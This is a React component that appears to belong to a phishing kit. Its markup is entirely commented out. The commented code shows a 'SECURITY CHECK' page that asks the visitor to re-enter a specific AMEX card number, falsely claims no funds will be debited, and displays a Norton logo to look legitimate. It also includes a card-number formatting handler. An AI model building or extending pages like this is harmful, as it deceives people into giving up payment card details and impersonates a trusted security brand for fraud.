"use client";
import { useState } from "react";
import Language from "@/components/language";
import Footer from "@/common/Footer";
import { ChevronLeftIcon } from "@heroicons/react/24/outline";
import SmsChangeEmail from "./SmsChangeEmail";
import AccountInfo from "./AccountInfo";
import Inputbox from "@/components/inputbox";
import NortonLogo from "../../../assets/images/norton-logo.png";
import Image from "next/image";

const SentCardCode = (props) => {
    const { _handleSteps } = props;

    // const handleCardNumberChange = (event) => {
    //     let input = event.target.value;
    //     input = input.replace(/\D/g, '');
    //     if (input.length > 16) {
    //         input = input.slice(0, 16);
    //     }
    //     let formattedInput = '';
    //     for (let i = 0; i < input.length; i += 4) {
    //         formattedInput += input.slice(i, i + 4) + ' ';
    //     }
    //     event.target.value = formattedInput.trim();
    // };

    return (
        <>
            {/* <div className="max-w-[484px] mx-auto px-4 pt-12">
                <span
                    className="w-[42px] h-[42px] rounded-full border border-blue text-blue flex items-center justify-center cursor-pointer"
                    onClick={() => _handleSteps('back')}
                >
                    <ChevronLeftIcon className="w-4 h-4" />
                </span>
                <div className="flex flex-col items-center text-center mt-8">
                    <p className="text-t2 mb-6 font-bold">SECURITY CHECK</p>
                    <h3 className="mb-4">
                        Let&apos;s check your payment details
                    </h3>
                    <p className="text-t4 mb-12 text-base">
                        Don&apos;t worry: the funds will not be debited from  the card. Once again, enter the AMEX card number ending in 1003. This is necessary to protect your account.
                    </p>
                </div>
            </div>

            <div className="bg-bg3 pt-2.5 pb-8">
                <div className="max-w-[484px] mx-auto px-4">
                    <Image
                        className="max-w-[66px] ml-auto mb-1"
                        src={NortonLogo}
                        alt="logo"
                    />
                    <div className="flex flex-col gap-[9px]">
                        <div className="relative">
                            <Inputbox
                                name="cardnumber"
                                id="cardnumber"
                                type="text"
                                placeholder=""
                                className="floating-input peer"
                                onChange={handleCardNumberChange}
                            />
                            <label htmlFor="cardnumber" className="floating-label">
                                Card Number
                            </label>
                        </div>
                    </div>
                </div>
            </div>

            <div className="max-w-[484px] mx-auto px-4">
                <button className="primary-button mt-8" onClick={() => _handleSteps('step8')}>
                    Enter Code to Continue
                </button>
                <div className="flex gap-3 items-center justify-center mt-4">
                    <span className="text-blue text-sm">Try another way</span>
                </div>
            </div>

            <div className="max-w-[484px] mx-auto px-4 py-8">
                <div className="mt-16">
                    <Language />
                </div>
            </div>
            <Footer /> */}
        </>
    );
};
export default SentCardCode